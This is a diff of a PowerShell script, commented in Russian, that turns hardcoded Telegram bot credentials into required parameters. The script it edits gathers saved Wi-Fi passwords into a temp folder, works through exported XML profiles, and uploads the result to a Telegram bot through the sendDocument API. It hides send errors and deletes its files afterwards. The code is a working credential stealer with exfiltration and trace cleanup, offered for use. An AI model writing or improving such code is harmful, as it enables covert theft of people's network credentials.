@@ -1,8 +1,12 @@
-# Конфигурация Telegram бота
-$BotToken = "YOUR_BOT_API_TOKEN"  # <-- ЗАМЕНИТЕ на ваш API токен от BotFather
-$ChatID = "YOUR_CHAT_ID"          # <-- ЗАМЕНИТЕ на ваш Chat ID
+# Принимаем параметры извне
+param(
+    [Parameter(Mandatory=$true)]
+    [string]$BotToken,
+    [Parameter(Mandatory=$true)]
+    [string]$ChatID
+)
 
-# Извлекаем пароли и создаем файл
+# Далее следует ваш оригинальный код, но вместо захардкоженных значений используем переменные $BotToken и $ChatID
 $TempDir = "$env:temp\wifi-passwords"
 New-Item -ItemType Directory -Path $TempDir -Force | Out-Null
 Set-Location $TempDir
@@ -21,11 +25,8 @@ Get-ChildItem -Path "*.xml" | ForEach-Object {
     Remove-Item $_.FullName
 }
 
-# Отправляем файл в Telegram
+# Отправляем файл в Telegram (используем переданные параметры)
 $TelegramAPIUrl = "https://api.telegram.org/bot$BotToken/sendDocument"
-
-$File = Get-Item -Path $OutputFile
-
 $Form = @{
     chat_id = $ChatID
     document = Get-Item -Path $OutputFile
@@ -34,9 +35,9 @@ $Form = @{
 try {
     Invoke-RestMethod -Uri $TelegramAPIUrl -Form $Form -Method Post | Out-Null
 } catch {
-    # Ошибка отправки
+    # Обработка ошибок
 }
 
-# Удаляем временную директорию и файл
+# Уборка
 Remove-Item $TempDir -Recurse -Force -ErrorAction SilentlyContinue
 Remove-Item $OutputFile -Force -ErrorAction SilentlyContinue
